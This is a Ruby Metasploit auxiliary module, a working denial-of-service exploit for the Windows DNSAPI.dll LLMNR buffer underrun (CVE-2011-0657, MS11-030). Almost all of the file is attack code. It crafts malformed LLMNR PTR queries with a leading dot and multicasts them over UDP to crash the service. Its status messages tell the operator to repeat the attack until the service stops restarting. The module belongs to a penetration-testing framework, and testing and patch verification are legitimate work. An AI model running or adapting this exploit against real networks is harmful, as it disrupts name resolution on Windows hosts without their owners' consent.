##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize
    super(
      'Name'        => 'Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS',
      'Description' => %q{
          This module exploits a buffer underrun vulnerability in Microsoft's DNSAPI.dll
        as distributed with Windows Vista and later without KB2509553. By sending a
        specially crafted LLMNR query, containing a leading '.' character, an attacker
        can trigger stack exhaustion or potentially cause stack memory corruption.

        Although this vulnerability may lead to code execution, it has not been proven
        to be possible at the time of this writing.

        NOTE: In some circumstances, a '.' may be found before the top of the stack is
        reached. In these cases, this module may not be able to cause a crash.
      },
      'Author'      => 'jduck',
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2011-0657' ],
          [ 'OSVDB', '71780' ],
          [ 'MSB', 'MS11-030' ]
        ],
      'DisclosureDate' => 'Apr 12 2011')

    register_options(
      [
        Opt::RPORT(5355),
        Opt::RHOST('224.0.0.252')
      ])
  end

  def make_query(str)
    pkt = ""

    # id
    pkt << [rand(65535)].pack('n')

    # flags
    pkt << [(
      '0' +     # qr
      '0000' +  # opcode
      '0' +     # conflict
      '0' +     # truncation
      '0' +     # tenative
      '0000' +  # zero (reserved)
      '0000'    # rcode
      )].pack('B16')

    # counts
    pkt << [1,0,0,0].pack('n*')

    if str[0,1] == "."
      pkt << [str.length].pack('C')
    end
    pkt << str + "\x00"

    # type / class (PTR/IN)
    pkt << [0x0c, 0x01].pack('n*')

    pkt
  end


  def run
    connect_udp

    # query

    # various compressed queries
    #pkt << "\x03" + ("%d" % 192)
    #pkt << "\x03" + "144" + "\x01" + "0" + "\x03" + "168" + "\x03" + "192"
    #pkt << ("\x01" + '1') * 0x20
    #pkt << "\x01" + '.'
    #pkt << ("\x01\x2e") + "\x01" + "0"
    #pkt << "\x07" + 'in-addr' + "\x04" + 'arpa' + "\x00"
    #pkt << "\x03" + 'ip6' + "\x04" + 'arpa' + "\x00"
    #pkt << ".e.e.e.e.e.e.e.e.e.e.e.e.e.e.e.e.0.0.0.0.0.0.0.0.0.0.0.0.0.8.e.f".gsub('.', "\x01") + "\x03ip6\x04arpa\x00"

    pkt = make_query(".1.1.ip6.arpa")
    print_status("Sending Ipv6 LLMNR query to #{rhost}")
    udp_sock.put(pkt)

    pkt = make_query(".1.1.in-addr.arpa")
    print_status("Sending Ipv4 LLMNR query to #{rhost}")
    udp_sock.put(pkt)

    print_status("Note, in a default configuration, the service will restart automatically twice.")
    print_status("In order to ensure it is completely dead, wait up to 5 minutes and run it again.")

    disconnect_udp
  end
end
